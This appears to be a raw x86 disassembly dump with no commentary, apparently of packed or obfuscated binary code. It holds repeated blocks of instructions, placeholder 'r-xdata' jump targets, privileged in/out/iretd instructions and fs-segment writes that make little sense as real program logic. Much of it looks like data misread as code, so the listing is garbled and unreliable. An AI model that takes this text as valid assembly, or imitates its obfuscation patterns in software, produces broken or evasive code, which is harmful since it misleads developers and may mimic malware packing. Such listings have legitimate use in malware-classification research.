and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804fa6c0
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
pop ecx
jne r-xdata
jbe 0xffd03a4
pop eax
jg r-xdata
jge 0xffffffff894f8b21
jae r-xdata
and edx 0xff53830f
pop edx
pop edx
jne r-xdata
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jno r-xdata
jge 0xffffffffffa0b6e3
ja r-xdata
jno 0xffffffffe89185be
push 0x81ffffff
out 0x77 al
jne r-xdata
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
push esp
push ebp
push edi
sub esp 0x4
call sub_403102
jae 0xffffffffff43b927
xor ecx 0x890fd079
or esi 0xff24810f
jge r-xdata
jpe 0x74cd42e7
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
ja r-xdata
and eax 0x4c48358
jno r-xdata
jae 0xffffffff8428ab9d
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub esp 0x28
pop ecx
pop edx
sub ebx 0xff2f850f
jns 0x158b682
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
jae r-xdata
je 0xffffffffff6db76f
jge r-xdata
les ecx [ eax ]
add [ eax ] al
push edi
call sub_403354
jg 0xfffffffff0b38d7b
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133c1fe
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x58662877
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a8d51
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jae r-xdata
call 0xffffffff854f8d8b
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95d02c
jo 0xffffffffa2c1423f
push ecx
push edx
call sub_403324
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c16681
push edx
call sub_4032c0
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_40333b
jo 0xff9a928
jo 0xffffffff894f8d65
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_4032fe
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
push esp
push eax
call sub_4033a4
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53b8af
push esp
pushfd
push ecx
sub esp 0xc
call sub_403321
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_403097
ja r-xdata
jno r-xdata
jl 0x2f28ccf8
jno r-xdata
jl 0xfffffffff6c1ee5b
add [ eax ] al
add [ edx + 0x7504c483 ] bh
pop edx
pop edx
jns 0xffffffff81500d06
ja r-xdata
jae r-xdata
xor ecx 0xc18d0f
add [ eax ] al
sub esi 0x73bd047f
push ebp
jne r-xdata
jge r-xdata
jmp [ 0xffffffff8964ba73 ]
sub [ esp + 0x58 ] 0x2
sub esp 0x14
pop ecx
jne r-xdata
je 0xffffffffffa3b7cc
pop eax
jne r-xdata
xor edi 0x9b810f
add [ eax ] al
jg r-xdata
xor ecx 0xff70810f
jae r-xdata
ja 0xffffffff89a46d31
jno r-xdata
mov ebx 0xf04c483
ja r-xdata
call 0xffca96a
cmp [ edi + 0x7f ] 0x81

ja r-xdata
or ebx 0xff6e8f0f
jns r-xdata
mov [ fs : edi ] ecx
or esp 0x0
add [ eax ] al
pop eax
ja r-xdata
xor edx 0x880f5e7f
add [ eax ] al
jns r-xdata
mov edi 0x9c555757
ja r-xdata
xor ebx 0xff3d870f
ja r-xdata
jg r-xdata
mov ebp 0xf5d7d58
cmp [ ebp + 0x36 ] 0x3d77870f
jne r-xdata
add edi 0xad850f58
add [ eax ] al
add al ch
jne r-xdata
sub edi 0x64244481
jno r-xdata
add esp 0x4
ja r-xdata
jl 0xffffffffffacc0f8
jae r-xdata
ja 0xffffffffa3c34090
jae r-xdata
xor ebx 0xff728f0f
jae r-xdata
jmp 0xffffffffff79b18e
ja r-xdata
jge 0x71fc6fd3
jg r-xdata
xor esi 0x25ffca77
jg r-xdata
jo 0xffffffffcbc1af95
jg r-xdata
jpo 0xdeb676
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
inc eax
add [ ebx + 0x5a5928ec ] al
jge r-xdata
add esi 0x83575554
in al dx
add al 0xe8
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
jg r-xdata
and ebx 0xff5a870f
jg r-xdata
add eax 0x5abb2979
jno r-xdata
mov [ fs : edx + 0x5a ] ebx
add [ ecx + 0x42850fe2 ] 0xffffffff
jg r-xdata
add ecx 0xaa890f
add [ eax ] al
jns r-xdata
mov ebp 0x79055573
sub [ ebx - 0x7ed288a6 ] edi
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
jg r-xdata
sub edi 0xf681b871
jne r-xdata
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
jae r-xdata
or edx 0xf0c775a
xor [ ebx + 0x3e ] 0x5a59ef81
jne r-xdata
jg r-xdata
or eax 0x97e8569c
add [ eax ] al
add [ ecx - 0x5b70f015 ] al
add [ eax ] al
add [ ecx + 0xc775aca ] al
jno 0xffffffffefc16eba
jno r-xdata
sub esi 0x89641f79
ja r-xdata
jge r-xdata
call [ 0xffffffffca81677d ]
jns r-xdata
test [ edi ] 0x9b81
add [ edi ] cl
mov ebx 0x812d775a
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff93aee
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_403465
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
push edx
push esp
push edx
call sub_4030f7
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jae r-xdata
and esi 0x89641273
jae r-xdata
mov ebp 0x478f0f5a
pushfd
push esi
call sub_4030cb
sub ebx 0xa48f0f
add [ eax ] al
sub [ ecx + 0x1 ] 0x0
add [ edi ] cl
adc [ edi + edx * 2 + 0x56 ] 0x55
call sub_4031e5
add esi 0xa6830f
add [ eax ] al
mov esp 0x58246c83
add al [ ebx + 0xf5914ec ]
test esp ebx
add [ eax ] al
add [ ebx + 0xf04c483 ] bh
add esp 0x4
jne r-xdata
mov eax [ fs : 0xff37958 ]
test [ ebx - 0x1e ] esi
jae r-xdata
call [ 0xffffffffc181727f ]
push ecx
push edx
push ebp
sub esp 0x4
call sub_403097
xor ebx 0x15ff4e7f
mov edx 0xff47830f
jno r-xdata
mov esi 0x83555251
in al dx
add al 0xe8
sti
add [ eax ] al
add [ ecx - 0xb1800d ] al
adc eax 0xc181727f
jge r-xdata
mov [ fs : edi - 0x21 ] esi
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x7548f6aa
jg r-xdata
ja 0xcab4a6
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48f5b0
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
ja 0xffffffffff9bb34d
jae r-xdata
add edx 0xff108f0f
call sub_403047
and ecx 0x6c870f59
push edi
push edi
push ebp
pushfd
add eax 0xde810f
add [ eax ] al
rol [ ecx + 0x108f0fc2 ] 0xff
push ebp
pushfd
call sub_4030d4
mov edx 0x7504c483
mov esp 0xe2818371
jne r-xdata
or edx 0xf3812e79
pop edx
jge r-xdata
jo 0xffffffff854f8b9f
pop eax
jae r-xdata
and esi 0xc2817577
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f44f665
add [ eax ] al
dec ecx
pop ecx
jno r-xdata
call 0xf44f8d9
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
jae r-xdata
call sub_40325c
jb 0xffffffff81b2af12
or edx 0x54549c55
jno r-xdata
and ebx 0x870f4975
ja r-xdata
pop edx
mov eax 0xff55870f
pop eax
jge r-xdata
jge 0xffffffffffa2b380
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804fa6c0
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
pop ecx
jne r-xdata
jbe 0xffd03a4
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
jae r-xdata
xor esi 0xe681cd75
pop ecx
jns r-xdata
jno 0xffffffff874f6633
jae r-xdata
and edx 0xff53830f
pop edx
pop edx
jne r-xdata
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jno r-xdata
jge 0xffffffffffa0b6e3
add esp 0x4
jae r-xdata
jl 0xf3b428
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
push esp
push ebp
push edi
sub esp 0x4
call sub_403102
jae 0xffffffffff43b927
xor ecx 0x890fd079
or esi 0xff24810f
jge r-xdata
jpe 0x74cd42e7
pop eax
jg r-xdata
jge 0xffffffff894f8b21
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
ja r-xdata
and eax 0x4c48358
ja r-xdata
jno 0xffffffffe89185be
push 0x81ffffff
out 0x77 al
jne r-xdata
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub esp 0x28
pop ecx
pop edx
sub ebx 0xff2f850f
jns 0x158b682
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
add [ eax ] al
push edi
call sub_403354
jg 0xfffffffff0b38d7b
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133c1fe
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
jno r-xdata
jae 0xffffffff8428ab9d
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x58662877
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a8d51
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jae r-xdata
je 0xffffffffff6db76f
jge r-xdata
les ecx [ eax ]
jae r-xdata
call 0xffffffff854f8d8b
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95d02c
jo 0xffffffffa2c1423f
push ecx
push edx
call sub_403324
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c16681
push edx
call sub_4032c0
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_40333b
jo 0xff9a928
jo 0xffffffff894f8d65
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_4032fe
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
push esp
push eax
call sub_4033a4
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53b8af
push esp
pushfd
push ecx
sub esp 0xc
call sub_403321
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_4030cb
pop ecx
ja r-xdata
pop edx
ja r-xdata
jae 0xffffffff81cea630
pop eax
jns r-xdata
jno 0xffffffffefc16eba
out dx eax
jae r-xdata
jne 0xffffffffe3c212c9
push ecx
push edx
push ebp
sub esp 0x4
call sub_403097
xor ebx 0x15ff4e7f
mov edx 0xff47830f
jg r-xdata
sub edi 0x5c755a59
ja r-xdata
jg r-xdata
add ecx 0xaa890f
add [ eax ] al
jno r-xdata
jno 0xfffffffff1c1ba00
ja r-xdata
jge 0x71fc6fd3
jge r-xdata
call [ 0xffffffffca81677d ]
jae r-xdata
xor ecx 0xc18d0f
add [ eax ] al
sub esi 0x73bd047f
push ebp
ja r-xdata
and edx 0xff42850f
jno r-xdata
jno r-xdata
mov [ fs : edx + 0x5a ] ebx
add [ ecx + 0x42850fe2 ] 0xffffffff
jno r-xdata
mov esi 0x83555251
in al dx
add al 0xe8
sti
add [ eax ] al
add [ ecx - 0xb1800d ] al
adc eax 0xc181727f
jae r-xdata
xor ebx 0xff728f0f
sub [ esp + 0x58 ] 0x2
sub esp 0x14
pop ecx
jne r-xdata
je 0xffffffffffa3b7cc
pop eax
jne r-xdata
xor edi 0x9b810f
add [ eax ] al
jl 0xfffffffff6c1ee5b
jge r-xdata
jmp [ 0xffffffff8964ba73 ]
ja r-xdata
jmp [ 0xfffffffff381df77 ]
jno r-xdata
sub esi 0x89641f79
push ebp
pushfd
call sub_4030d4
mov edx 0x7504c483
rol [ ecx + 0x108f0fc2 ] 0xff
mov esp 0xe2818371
jne r-xdata
mov ebp 0xf5d7d58
cmp [ ebp + 0x36 ] 0x3d77870f
jg r-xdata
and ebx 0xff5a870f
jno r-xdata
mov ebx 0xf04c483
ja r-xdata
call 0xffca96a
cmp [ edi + 0x7f ] 0x81

jae r-xdata
ja 0xffffffff89a46d31
jne r-xdata
add edi 0xad850f58
add [ eax ] al
add al ch
pop eax
jge r-xdata
jge 0xffffffffffa2b380
jae r-xdata
or edx 0xf0c775a
xor [ ebx + 0x3e ] 0x5a59ef81
jne r-xdata
pop eax
ja r-xdata
xor edx 0x880f5e7f
add [ eax ] al
jns r-xdata
mov edi 0x9c555757
jns r-xdata
mov [ fs : edi ] ecx
or esp 0x0
add [ eax ] al
jg r-xdata
pop edx
pop edx
jg r-xdata
xor esi 0x25ffca77
jg r-xdata
jo 0xffffffffcbc1af95
pop ecx
jns r-xdata
jno 0xffffffff874f6633
pushfd
push esi
call sub_4030cb
sub ebx 0xa48f0f
add [ eax ] al
sub [ ecx + 0x1 ] 0x0
add [ edi ] cl
adc [ edi + edx * 2 + 0x56 ] 0x55
call sub_4031e5
add esi 0xa6830f
add [ eax ] al
mov esp 0x58246c83
add al [ ebx + 0xf5914ec ]
test esp ebx
add [ eax ] al
add [ ebx + 0xf04c483 ] bh
add esp 0x4
jne r-xdata
mov eax [ fs : 0xff37958 ]
test [ ebx - 0x1e ] esi
jne r-xdata
sub edi 0x64244481
jno r-xdata
add esp 0x4
ja r-xdata
jl 0xffffffffffacc0f8
jae r-xdata
ja 0xffffffffa3c34090
jns r-xdata
mov ebp 0x79055573
sub [ ebx - 0x7ed288a6 ] edi
jae r-xdata
add edx 0xff108f0f
jg r-xdata
jpo 0xdeb676
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
inc eax
add [ ebx + 0x5a5928ec ] al
jge r-xdata
add esi 0x83575554
in al dx
add al 0xe8
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
jns r-xdata
test [ edi ] 0x9b81
add [ edi ] cl
mov ebx 0x812d775a
ja r-xdata
pop edx
mov eax 0xff55870f
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
jg r-xdata
sub edi 0xf681b871
jne r-xdata
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
jge r-xdata
mov [ fs : edi - 0x21 ] esi
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff93aee
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_403465
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
push edx
push esp
push edx
call sub_4030f7
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jae r-xdata
and esi 0x89641273
jae r-xdata
mov ebp 0x478f0f5a
jne r-xdata
or edx 0xf3812e79
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x7548f6aa
jg r-xdata
ja 0xcab4a6
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48f5b0
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
ja 0xffffffffff9bb34d
jg r-xdata
xor ecx 0xff70810f
jg r-xdata
or eax 0x97e8569c
add [ eax ] al
add [ ecx - 0x5b70f015 ] al
add [ eax ] al
add [ ecx + 0xc775aca ] al
pop edx
jge r-xdata
jo 0xffffffff854f8b9f
pop eax
jae r-xdata
and esi 0xc2817577
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f44f665
add [ eax ] al
dec ecx
pop ecx
jno r-xdata
call 0xf44f8d9
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
jae r-xdata
call sub_40325c
jb 0xffffffff81b2af12
or edx 0x54549c55
jno r-xdata
and ebx 0x870f4975
ja r-xdata
or ebx 0xff6e8f0f
jae r-xdata
call [ 0xffffffffc181727f ]
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804fa6c0
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
pop ecx
jne r-xdata
jbe 0xffd03a4
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
jae r-xdata
xor esi 0xe681cd75
ja r-xdata
xor ebx 0xff3d870f
call sub_403047
and ecx 0x6c870f59
push edi
push edi
push ebp
pushfd
add eax 0xde810f
add [ eax ] al
jae r-xdata
and edx 0xff53830f
pop edx
pop edx
jne r-xdata
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jno r-xdata
jge 0xffffffffffa0b6e3
add esp 0x4
jae r-xdata
jl 0xf3b428
jae r-xdata
jmp 0xffffffffff79b18e
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
push esp
push ebp
push edi
sub esp 0x4
call sub_403102
jae 0xffffffffff43b927
xor ecx 0x890fd079
or esi 0xff24810f
jge r-xdata
jpe 0x74cd42e7
pop eax
jg r-xdata
jge 0xffffffff894f8b21
jg r-xdata
add eax 0x5abb2979
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
ja r-xdata
and eax 0x4c48358
ja r-xdata
jno 0xffffffffe89185be
push 0x81ffffff
out 0x77 al
jne r-xdata
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub esp 0x28
pop ecx
pop edx
sub ebx 0xff2f850f
jns 0x158b682
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
add [ eax ] al
push edi
call sub_403354
jg 0xfffffffff0b38d7b
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133c1fe
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
jno r-xdata
jae 0xffffffff8428ab9d
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x58662877
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a8d51
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jae r-xdata
je 0xffffffffff6db76f
jge r-xdata
les ecx [ eax ]
jae r-xdata
call 0xffffffff854f8d8b
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95d02c
jo 0xffffffffa2c1423f
push ecx
push edx
call sub_403324
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c16681
push edx
call sub_4032c0
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_40333b
jo 0xff9a928
jo 0xffffffff894f8d65
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_4032fe
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
push esp
push eax
call sub_4033a4
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53b8af
push esp
pushfd
push ecx
sub esp 0xc
call sub_403321
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_4030d4
pop eax
jne r-xdata
jne r-xdata
sub edi 0xfeb2810f
pop eax
jge r-xdata
jge 0xffffffffffa2b380
pop ecx
jns r-xdata
jno 0xffffffff874f6633
jg r-xdata
jo 0xffffffffcbc1af95
ja r-xdata
jns r-xdata
mov ebp 0x79055573
sub [ ebx - 0x7ed288a6 ] edi
jg r-xdata
jno r-xdata
mov [ fs : edx + 0x5a ] ebx
jns r-xdata
test [ edi ] 0x9b81
add [ edi ] cl
mov ebx 0x812d775a
jge r-xdata
call [ 0xffffffffca81677d ]
jno r-xdata
sub esi 0x89641f79
ja r-xdata
jae r-xdata
xor ecx 0xc18d0f
add [ eax ] al
sub esi 0x73bd047f
push ebp
jge r-xdata
mov [ fs : edi - 0x21 ] esi
jno r-xdata
mov esi 0x83555251
in al dx
add al 0xe8
sti
add [ eax ] al
add [ ecx - 0xb1800d ] al
adc eax 0xc181727f
jae r-xdata
xor ebx 0xff728f0f
push ecx
push edx
push ebp
sub esp 0x4
call sub_403097
xor ebx 0x15ff4e7f
mov edx 0xff47830f
jne r-xdata
add edi 0xad850f58
add [ eax ] al
add al ch
sub [ esp + 0x58 ] 0x2
sub esp 0x14
pop ecx
jne r-xdata
je 0xffffffffffa3b7cc
pop eax
jne r-xdata
xor edi 0x9b810f
add [ eax ] al
jl 0xfffffffff6c1ee5b
jne r-xdata
or edx 0xf3812e79
push ebp
pushfd
call sub_4030d4
mov edx 0x7504c483
rol [ ecx + 0x108f0fc2 ] 0xff
mov esp 0xe2818371
ja r-xdata
mov ebp 0xf5d7d58
cmp [ ebp + 0x36 ] 0x3d77870f
jg r-xdata
and ebx 0xff5a870f
add ecx 0xaa890f
add [ eax ] al
jg r-xdata
xor esi 0x25ffca77
jno r-xdata
mov ebx 0xf04c483
ja r-xdata
call 0xffca96a
cmp [ edi + 0x7f ] 0x81

ja r-xdata
jg r-xdata
xor ecx 0xff70810f
jg r-xdata
or eax 0x97e8569c
add [ eax ] al
add [ ecx - 0x5b70f015 ] al
add [ eax ] al
add [ ecx + 0xc775aca ] al
jno 0xffffffffefc16eba
jge 0x71fc6fd3
jae r-xdata
or edx 0xf0c775a
xor [ ebx + 0x3e ] 0x5a59ef81
jne r-xdata
jns r-xdata
mov [ fs : edi ] ecx
or esp 0x0
add [ eax ] al
pop eax
ja r-xdata
xor edx 0x880f5e7f
add [ eax ] al
jns r-xdata
mov edi 0x9c555757
jge r-xdata
jmp [ 0xffffffff8964ba73 ]
ja r-xdata
or ebx 0xff6e8f0f
jae r-xdata
call [ 0xffffffffc181727f ]
add [ ecx + 0x42850fe2 ] 0xffffffff
pushfd
push esi
call sub_4030cb
sub ebx 0xa48f0f
add [ eax ] al
sub [ ecx + 0x1 ] 0x0
add [ edi ] cl
adc [ edi + edx * 2 + 0x56 ] 0x55
call sub_4031e5
add esi 0xa6830f
add [ eax ] al
mov esp 0x58246c83
add al [ ebx + 0xf5914ec ]
test esp ebx
add [ eax ] al
add [ ebx + 0xf04c483 ] bh
add esp 0x4
jne r-xdata
mov eax [ fs : 0xff37958 ]
test [ ebx - 0x1e ] esi
jne r-xdata
sub edi 0x64244481
jno r-xdata
add esp 0x4
ja r-xdata
jl 0xffffffffffacc0f8
jae r-xdata
ja 0xffffffffa3c34090
jae r-xdata
ja 0xffffffff89a46d31
ja r-xdata
xor ebx 0xff3d870f
call sub_403047
and ecx 0x6c870f59
push edi
push edi
push ebp
pushfd
add eax 0xde810f
add [ eax ] al
jae r-xdata
add edx 0xff108f0f
jg r-xdata
jpo 0xdeb676
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
inc eax
add [ ebx + 0x5a5928ec ] al
jge r-xdata
add esi 0x83575554
in al dx
add al 0xe8
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
jg r-xdata
pop edx
pop edx
jae r-xdata
jmp 0xffffffffff79b18e
ja r-xdata
pop edx
mov eax 0xff55870f
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
jg r-xdata
sub edi 0xf681b871
jne r-xdata
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
jg r-xdata
add eax 0x5abb2979
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff93aee
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_403465
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
push edx
push esp
push edx
call sub_4030f7
